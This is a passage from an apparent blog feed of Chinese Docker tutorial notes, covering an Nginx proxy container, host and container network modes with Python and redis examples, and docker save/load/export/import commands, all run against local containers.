src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121529331977_884_image-20230905175403597.png" alt="image-20230905175403597"><figcaption aria-hidden="true">image-20230905175403597</figcaption></figure><ol start="2" type="1"><li>编写Nginx配置文件</li></ol><p>接下来我们来配置Nginx容器作为代理服务器。首先我们宿主机中生成Nginx的配置文件<code>proxy.conf</code>。在配置文件中，我们设置两个配置信息，分别是对8001端口的访问转发到<strong>python1的80端口</strong>，以及对8002端口的访问转发到<strong>httpd1的80端口</strong>。我们使用<code>vi</code>命令编写<code>proxy.conf</code>并编辑为如下内容。注意使用vi编辑器时：</p><ol type="1"><li>需要先按i键进入编辑模式。</li><li>编辑完成之后按esc退出编辑模式。</li><li>然后按大写的ZZ保存并退出vi。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v5ounclmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-v5ounclmrh9u69"><pre><code class="hljs shell">vi proxy.conf</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l3x7rnlmrh9u69"></i><span>nginx</span><div class="collapse show" id="collapse-l3x7rnlmrh9u69"><pre><code class="hljs nginx"><span class="hljs-section">server</span> {    <span class="hljs-attribute">listen</span>       <span class="hljs-number">8001</span>;    <span class="hljs-attribute">server_name</span>  <span class="hljs-number">0.0.0.0</span>;    <span class="hljs-section">location</span> / {        <span class="hljs-attribute">proxy_pass</span>   http://python1;    }}<span class="hljs-section">server</span> {    <span class="hljs-attribute">listen</span>       <span class="hljs-number">8002</span>;    <span class="hljs-attribute">server_name</span>  <span class="hljs-number">0.0.0.0</span>;    <span class="hljs-section">location</span> / {        <span class="hljs-attribute">proxy_pass</span>   http://httpd1;    }}</code></pre></div></div><ol start="3" type="1"><li>编写Dockerfile</li></ol><p>Nginx配置文件生成完毕之后，接下来我们来编辑<code>Dockerfile</code>。在<code>Dockerfile</code>中，我们将配置文件复制到<code>/etc/nginx/conf.d/proxy.conf</code>目录中。我们使用vi命令生成<code>Dockerfile</code>并编辑为如下内容：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h2bb77lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-h2bb77lmrh9u69"><pre><code class="hljs shell">vi Dockerfile</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lpdfnalmrh9u69"></i><span>dockerfile</span><div class="collapse show" id="collapse-lpdfnalmrh9u69"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nginx:latest<span class="hljs-keyword">ADD</span><span class="language-bash"> proxy.conf /etc/nginx/conf.d/proxy.conf</span></code></pre></div></div><blockquote><p>注：此处原文表述有较多处错误，已订正。</p></blockquote><ol start="4" type="1"><li>启动代理服务</li></ol><p>Dockerfile编辑完成后，我们继续生成容器镜像<code>proxy</code>。镜像生成成功后，我们通过该镜像创建容器<code>proxy1</code>。在创建容器的时候，我们使用<code>--link</code>参数添加python1和httpd1域名，同时将proxy容器的80，8001，8002端口映射到宿主的8000，8001，8002。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dch69wlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-dch69wlmrh9u69"><pre><code class="hljs shell">docker build -t proxy .docker run -d --name proxy1 -p 8000:80 -p 8001:8001 -p 8002:8002 \--link python1 --link httpd1 proxy</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121533471480_288_image-20230905180422754.png" alt="image-20230905180422754"><figcaption aria-hidden="true">image-20230905180422754</figcaption></figure><ol start="5" type="1"><li>验证Nginx代理服务</li></ol><p>代理服务启动之后，我们使用<code>curl</code>命令进行验证。分别访问127.0.0.1的8000，8001，8002三个端口，我们会发现通过容器proxy在宿主机上的端口映射，我们实现了对三个容器的统一访问入口。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z9pdt9lmrh9u69"></i><span>nginx</span><div class="collapse show" id="collapse-z9pdt9lmrh9u69"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> <span class="hljs-number">127.0.0.1:8000</span>curl <span class="hljs-number">127.0.0.1:8001</span>curl <span class="hljs-number">127.0.0.1:8002</span></code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121539097331_620_image-20230905180212999.png" alt="image-20230905180212999"><figcaption aria-hidden="true">image-20230905180212999</figcaption></figure><h2 id="容器的共享网络模型">容器的共享网络模型</h2><h3 id="host网络模型简介">Host网络模型简介</h3><p>在上一个实验中我们学习了docker中的bridge网络模式。在bridge网络模式下，容器和宿主机网络隔离。不同网络下的容器具有不同的网络地址，这种网络模式的优点是架构比较清晰，资源具有必要的隔离。</p><p>但是这种架构的缺点是容器和容器，容器和宿主机之间的网络通讯的数据包需要在不同的虚拟网卡之间传输。这种传输需要通过操作系统的底层驱动，在网络数据量大的时候会对系统资源造成消耗。同时在当容器和外网互相访问时，需要使用NAT/DNAT修改网络数据包的地址字段。这也会对系统资源造成消耗，并且对容器的网络吞吐造成影响。</p><p>因此当我们需要在容器中部署对外网网络吞吐量很大，或者对网络延迟比较敏感的服务时，采用Bridge模式并不是最好的选择，这种情况下我们可以选择<strong>Host网络模式</strong>。</p><ol type="1"><li>Host网络模式</li></ol><p>首先我们来看Docker中的Host网络模式的架构。在Host网络模式下，容器在创建之时，并不会创建虚拟网卡。而是共享使用宿主机的默认网卡，因此Host模式下，容器网卡的网络地址和宿主机网卡的网络地址一致。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121542480155_579_zfjcruuaylg7m_f3201d02623c49dc80d06754a0021d63.png" alt="host"><figcaption aria-hidden="true">host</figcaption></figure><p>在了解了Host网络模式之后，我们来看如何创建Host模式的容器。在上一个实验中我们学过可以通过<code>docker network ls</code>命令查看Docker网络。细心的同学可能会观察到，在Docker的默认网络中就包含一个<code>host网络</code>。这个网络的驱动使用的就是host。</p><p>因此当我们创建创建容器时，只需要使用<code>--network=host</code>参数，加入这个网络容器就会设置成Host网络模式。</p><ol start="2" type="1"><li>获得宿主机网卡信息</li></ol><p>接下来我们来验证Host网络模式中的容器和宿主机的网络设置。我们首先在宿主机中使用<code>ip addr</code>命令查看网卡IP。在宿主机中我们可以找到<code>默认网卡eth0</code>，和<code>docker默认Bridge网络docker0</code>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121547691885_678_image-20230905201850370.png" alt="image-20230905201850370"><figcaption aria-hidden="true">image-20230905201850370</figcaption></figure><ol start="3" type="1"><li>获得容器网卡配置</li></ol><p>接下来我们通过<code>docker exec</code>在容器中执行<code>ip addr</code>。我们会发现容器和宿主机的网卡完全一致。我们尝试pingdocker0网卡，发现也可以ping通。这也就验证了Host网络模式下，容器的网卡和宿主机属于共享状态。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pljn9hlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-pljn9hlmrh9u69"><pre><code class="hljs shell">docker exec host1 ip addrping [docker0 IP] -c1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121553078213_743_image-20230905202117058.png" alt="image-20230905202117058"><figcaption aria-hidden="true">image-20230905202117058</figcaption></figure><h3 id="host模型的python案例">Host模型的python案例</h3><p>在上一个小节中我们学习了Host网络模型的基本用法，在本小节中我们来看一个Host共享网络的案例。我们创建一个Python容器并启动一个Http服务。然后将容器连接到Host网络。然后再上一个小节中创建的<code>host1</code>容器中访问Python服务。</p><ol type="1"><li>创建Host容器</li></ol><p>Host网络模型和Bridge模型一样，支持多个容器接入。我们创建一个接入Host网络的Python容器<code>host2</code>，并在创建容器的时候通过<code>bash -c "python -m http.server 端口号"</code>启动python内置http服务的命令。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z8g9oalmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-z8g9oalmrh9u69"><pre><code class="hljs shell">docker run -itd --name host2 --network=host python \bash -c "python -m http.server 8000"</code></pre></div></div><ol start="2" type="1"><li>查询网络端口</li></ol><p>在Host网络模型中，为了保证网络传输效率，宿主机和所有的容器都使用了相同的网卡配置。因此在Host模型中，无论是在宿主机中或是容器中启动的服务绑定了端口。端口占用会对宿主机和所有容器生效。</p><p>接下来我们在宿主机中也启动一个python内置的http服务，服务绑定端口<code>8001</code>。然后再容器和宿主机中通过<code>netstat</code>命令查看端口占用情况。会发现无论是宿主机还是容器host1，端口8000和8001都被占用了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121558730303_763_image-20230905202712250.png" alt="image-20230905202712250"><figcaption aria-hidden="true">image-20230905202712250</figcaption></figure><ol start="3" type="1"><li>访问容器服务</li></ol><p>由于容器和宿主机都绑定了相同的网卡，因此即使是在服务中启动的服务，也不需要端口映射就可以在宿主机中访问。Host模式的这种设计简化了容器服务的发布流程，同时也提高了网络吞吐的效率。不过需要注意的是，由于容器和宿主机共享了网卡。因此我们要小心的分配宿主机和容器中服务的端口，以避免端口绑定冲突。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fsivh4lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-fsivh4lmrh9u69"><pre><code class="hljs shell">curl 127.0.0.1:8000 | head -n1</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121602244999_405_image-20230905202812343.png" alt="image-20230905202812343"><figcaption aria-hidden="true">image-20230905202812343</figcaption></figure><h3 id="container网络模型">Container网络模型</h3><p>在上面两个小节中我们了解了Docker中的一种共享网络模型Host。这种模式主要用于灵活的在宿主机网卡上发布应用，或者提高网络吞吐效率。除了这种共享网络模式之外，Docker还提供了另一种共享网络模式Container。接下来我们来学习这种网络模式的特点和用法。</p><ol type="1"><li>创建容器</li></ol><p>Host网络模式下，新创建的容器共享使用宿主机的网卡。而在Container网络模式和Host模式类似，只不过新创建的容器，共享的是<strong>另一个容器的网卡</strong>。</p><p>当我们希望创建一个使用Container网络模式的容器时，我们需要在dockerrun中使用<code>--network container:[已有容器名]</code>的参数格式。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z8zlszlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-z8zlszlmrh9u69"><pre><code class="hljs shell">docker run -itd --name container1 busyboxdocker run -itd --name container2 --network=container:container1 busybox</code></pre></div></div><ol start="2" type="1"><li>查看地址</li></ol><p>Container网络模型的容器创建完毕后，我可以在两个容器中使用ipaddr命令查看网卡信息，会发现两块网卡的信息完全一致。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rsgdgelmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-rsgdgelmrh9u69"><pre><code class="hljs shell">docker exec container1 ip addrdocker exec container2 ip addr</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121607764416_189_image-20230905203100315.png" alt="image-20230905203100315"><figcaption aria-hidden="true">image-20230905203100315</figcaption></figure><ol start="3" type="1"><li>创建python服务</li></ol><p>接下来我们再利用这块网卡创建一个名为python1的python容器，并在容器上启动一个python的http服务。由于dockerrun命令的参数较长，在此我们可以使用。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zecchvlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-zecchvlmrh9u69"><pre><code class="hljs shell">docker run -itd --name container3 \--network=container:container1 python \bash -c "python -m http.server 8000"</code></pre></div></div><ol start="4" type="1"><li>访问服务</li></ol><p>在服务启动后，由于三个容器使用了相同的网卡，因此我们在container1容器使用127.0.0.1网络地址就可以访问到另一个容器中的服务。</p><p>由于在busybox容器中没有curl命令，这种情况下我们可以使用nc命令来访问http服务。具体访问命令解释如下：</p><ul><li>首先我们使用exec命令进入容器的控制台。</li><li>在控制台中我们使用printf命令构建一个HTTP访问请求</li><li>然后通过|符号将请求发送给nc命令</li><li>在使用nc命令时，我们将IP和端口作为两个参数传入</li></ul><p>执行后，命令返回了HTTP应答的全部信息。这也就验证了在container模型下，容器可以向访问本机服务一样，跨容器进行服务访问。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g2tzyflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-g2tzyflmrh9u69"><pre><code class="hljs shell">docker exec -it container1 sh</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-djpwhulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-djpwhulmrh9u69"><pre><code class="hljs shell">printf "GET / HTTP/1.1\r\n\r\n" | nc 127.0.0.1 8000</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121613687049_409_image-20230905203413825.png" alt="image-20230905203413825"><figcaption aria-hidden="true">image-20230905203413825</figcaption></figure><p>执行<code>exit</code>命令退出容器控制台。</p><h3 id="container模型的redis案例">Container模型的redis案例</h3><p>上一个小节中我们学习了Container模式的基本用法。相比较DNS而言，使用这种方式网络地址管理会更加的方便，同时由于不同的容器共享了一块网卡，网络传输的效率也有明显的提升。</p><p>在容器的使用实践时，我们在一个容器中一般只部署一个组件。对于一些由多个组件构成的服务，我们一般会使用Container网络模式。将不同的组件发布到同一个网卡上。这样不同的组件就可以向部署在同一个系统上一样使用。</p><p>接下来我们来学习一个redis和Python两个组件组成的服务的部署案例。</p><ol type="1"><li>启动redis容器</li></ol><p>redis是一个上手容易，使用简单的内存存储服务组件。通常被用来当作web服务的缓存组件来使用。首先我们来创建一个名为redis1的redis容器。当容器创建之后，我们可以通过<code>redis-cli</code>命令进入redis的控制台。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121619384406_970_image-20230905204040328.png" alt="image-20230905204040328"><figcaption aria-hidden="true">image-20230905204040328</figcaption></figure><ol start="2" type="1"><li>初始化redis数据</li></ol><p>在redis中数据的存储结构采用的是<code>key/value</code>结构，在控制台中我们可以通过<code>set [key] [value]</code>命令存储数据。数据存储后可以使用<code>get [key]</code>命令读取数据。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-86rihvlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-86rihvlmrh9u69"><pre><code class="hljs shell">set name aliyunset year 2000get nameget yearexit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121623021954_340_image-20230905204058709.png" alt="image-20230905204058709"><figcaption aria-hidden="true">image-20230905204058709</figcaption></figure><ol start="3" type="1"><li>安装Python的redis工具</li></ol><p>接下来我们再启动一个名为python1的python容器，并和redis1容器共享网卡。在容器创建成功后，我们在容器中使用pipinstall命令安装访问redis的工具。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kmr0uulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-kmr0uulmrh9u69"><pre><code class="hljs shell">docker run -itd --name python1 --network=container:redis1 pythondocker exec python1 pip install redis</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121626357968_113_image-20230905204353188.png" alt="image-20230905204353188"><figcaption aria-hidden="true">image-20230905204353188</figcaption></figure><ol start="4" type="1"><li>通过Python脚本调用redis</li></ol><p>接下来我们在python1容器中执行<code>python</code>命令，进入命令行模式。在命令行模式中，我们可以一条一条的输入命令。并观察命令的执行结果。</p><p>首先我们使用<code>import redis</code>命令加载访问工具，加载完成后，使用<code>redis.Redis()</code>命令创建到redis服务的连接。在创建连接时虽然python服务和redis服务不在同一个容器中，但是由于我们共享了网卡，我们还是可以使用127.0.0.1的网络地址来访问不同容器的服务。</p><p>连接创建之后，我们就可以使用<code>keys(*)</code>命令列出redis中所有的key，然后我们继续使用<code>get([key名字])</code>的命令获得key对应的value。我们发现通过python容器获得数据和在redis-cli中获得的数据是一致的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tbw5itlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tbw5itlmrh9u69"><pre><code class="hljs shell">docker exec -it python1 pythonimport redisr = redis.Redis(host='127.0.0.1',port=6379,db=0)print(r.keys('*'))print(r.get('name'))print(r.get('year'))exit()</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/20230906121632033915_844_image-20230905205150802.png" alt="image-20230905205150802"><figcaption aria-hidden="true">image-20230905205150802</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出Docker应用-Docker容器镜像</title>
    <link href="/posts/10725/"/>
    <url>/posts/10725/</url>
    
    <content type="html"><![CDATA[<h1 id="深入浅出docker应用-docker容器镜像">深入浅出docker应用-Docker容器镜像</h1><h2 id="容器镜像管理命令">容器镜像管理命令</h2><h3 id="镜像的下载显示和删除">镜像的下载，显示和删除</h3><p>在docker中镜像保存了容器创建时的基础文件内容和相关的配置信息，镜像一旦创建其中的文件就不可修改了。用户在通过镜像启动容器之后所有对文件的操作，都保存在容器对象当中而不会影响原有的容器镜像。接下来我们来讲解镜像相关的命令。</p><ol type="1"><li>实验资源准备</li></ol><p>通过<code>docker pull</code>可以实现镜像的下载，通过<code>docker images</code>可以显示。此处我们下载一个新的镜像<code>debian</code>来进行测试相关的操作。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8m8zq6lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-8m8zq6lmrh9u69"><pre><code class="hljs shell">docker pull debiandocker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115336118310_589_image-20230905111740289.png" alt="image-20230905111740289"><figcaption aria-hidden="true">image-20230905111740289</figcaption></figure><ol start="2" type="1"><li>镜像的查看</li></ol><p>对于已经保存在本地的镜像，我们可以使用<code>docker inspect</code>命令来查看镜像的详细信息，其用法为<code>docker inspect</code>镜像名，接下来我们来查看<code>debian</code>镜像的属性。会发现<code>docker inspect</code>命令会输出大量JSON格式的镜像详细信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l0azgglmrh9u69"></i><span>ebnf</span><div class="collapse show" id="collapse-l0azgglmrh9u69"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker inspect debian</span></code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115340457256_880_image-20230905111840241.png" alt="image-20230905111840241"><figcaption aria-hidden="true">image-20230905111840241</figcaption></figure><ol start="3" type="1"><li>镜像的删除</li></ol><p>当镜像下载之后，我们可以通过<code>docker rmi</code>命令进行删除。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2hccc8lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-2hccc8lmrh9u69"><pre><code class="hljs shell">docker run -itd --name debian-3 debiandocker rm -f debian-3docker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115345002211_731_image-20230905112209925.png" alt="image-20230905112209925"><figcaption aria-hidden="true">image-20230905112209925</figcaption></figure><p>要注意的是<code>docker rmi</code>无法删除已经创建了容器的镜像，如果需要删除需要先停止相关的容器，并添加<code>--force</code>参数。接下来我们再来测试通过镜像创建容器，然后在删除容器之后删除<code>debian</code>镜像。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-alqryulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-alqryulmrh9u69"><pre><code class="hljs shell">docker rmi --force debiandocker images`</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115349316003_313_image-20230905112249614.png" alt="image-20230905112249614"><figcaption aria-hidden="true">image-20230905112249614</figcaption></figure><h3 id="镜像的保存和加载">镜像的保存和加载</h3><p>一般情况下我们可以通过<code>docker pull</code>的方式通过镜像仓库将镜像下载到本地docker内部。但是这种方法需要保证docker宿主机可以访问到外网且访问速度有保证。如果用户在网络条件不好的情况下希望获取镜像，则可以将镜像的保存到本地文件，然后通过文件复制到容器宿主机上加载方式获得镜像。本小节将为大家介绍这种方法。</p><ol type="1"><li>镜像的本地保存</li></ol><p>首先我们可以通过<code>docker save</code>命令可以将docker内部的一个或多个镜像导出成文件。下面的命令中我们先下载nginx，hello-world两个镜像，然后再将镜像导出到<code>images.tar</code>文件中。dockersave的格式为：<code>docker save -o [导出文件名] [需要导出的镜像列表]...</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3s9x8xlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-3s9x8xlmrh9u69"><pre><code class="hljs shell">docker pull hello-worlddocker pull nginxdocker save -o images.tar nginx hello-world ll images.tar</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115604979456_700_image-20230905112510946.png" alt="image-20230905112510946"><figcaption aria-hidden="true">image-20230905112510946</figcaption></figure><ol start="2" type="1"><li>删除已有镜像</li></ol><p>上一步已经将nginx，hello-world两个镜像保存到文件images.tar。接下面我们将现有的两个镜像从docker内部删除。为后面的镜像读取做准备。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zremdilmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-zremdilmrh9u69"><pre><code class="hljs shell">docker rmi hello-worlddocker rmi nginxdocker images</code></pre></div></div><ol start="3" type="1"><li>从本地加载镜像文件</li></ol><p>接下来我们通过<code>docker load</code>命令将<code>images.tar</code>中的两个镜像导入回docker内部。即可实现在没有网络访问的情况更新镜像。<code>docker load</code>的格式为：<code>docker load -i [导入文件名]</code>。要注意的是：如果docker内部已经存在了相关的镜像，文件中的镜像会被忽略。</p><p>在镜像导入完毕之后，我们可以通过<code>docker image</code>进行验证。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-aq7uh7lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-aq7uh7lmrh9u69"><pre><code class="hljs shell">docker load -i images.tardocker images</code></pre></div></div><h3 id="容器快照的导出和导入">容器快照的导出和导入</h3><p>上一个小节我们学习了通过<code>docker save</code>和<code>docker load</code>的方法实现docker内部的镜像保存和加载。在docker中我们除了可以对镜像进行保存和加载，还可以对已经已经创建的容器进行保存和加载。接下来我们就来带领大家学习相关的命令。</p><ol type="1"><li>创建实验容器</li></ol><p>首先我们创建一个容器<code>python-1</code>，然后在<code>python-1</code>创建一个文本文件。此处我们可以使用<code>docker exec bash -c</code>"命令行"方式直接在宿主机执行命令。我们通过<code>echo</code>命令在容器中创建名为<code>snapshot.txt</code>的文件。在创建之后再使用<code>cat</code>命令验证容器中的文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dm8l5rlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-dm8l5rlmrh9u69"><pre><code class="hljs shell">docker run -itd --name python-1 pythondocker exec python-1 bash -c "echo snapshot &gt; snapshot.txt"docker exec python-1 bash -c "cat snapshot.txt"`</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115609558385_183_image-20230905113832779.png" alt="image-20230905113832779"><figcaption aria-hidden="true">image-20230905113832779</figcaption></figure><ol start="2" type="1"><li>容器快照的导出</li></ol><p>当容器文件修改之后，我们可以通过<code>docker export</code>命令将容器以快照的形式导出到文件。其命令的格式为<code>docker export 容器名 &gt; 快照文件名</code>。和镜像导出不同，快照的导出，会将容器的镜像，和容器在镜像之上的修改部分同时导出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9ran6jlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-9ran6jlmrh9u69"><pre><code class="hljs shell">docker export python-1 &gt; python-snapshot.tarll python-snapshot.tar</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115614943354_328_image-20230905114017315.png" alt="image-20230905114017315"><figcaption aria-hidden="true">image-20230905114017315</figcaption></figure><ol start="3" type="1"><li>容器快照的导入</li></ol><p>对于通过<code>docker export</code>导出的容器快照文件。我们可以通过<code>docker import</code>命令将其导入到docker中，在这里需要特别注意的是：<code>docker import</code>是以镜像而不是容器的形式导入快照。也就是说导入的快照并不能直接运行，而是需要根据此快照镜像再次创建容器才可以使用。dockerimport命令的格式为docker import 快照文件 导入镜像名称:版本号</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tqpphhlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tqpphhlmrh9u69"><pre><code class="hljs shell">docker import python-snapshot.tar python-snapshot:latest</code></pre></div></div><p>快照导入后，我们可以利用导入的快照镜像创造一个新的容器。并验证通过快照创建的容器中包含着之前容器中创建的文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bdhsq3lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-bdhsq3lmrh9u69"><pre><code 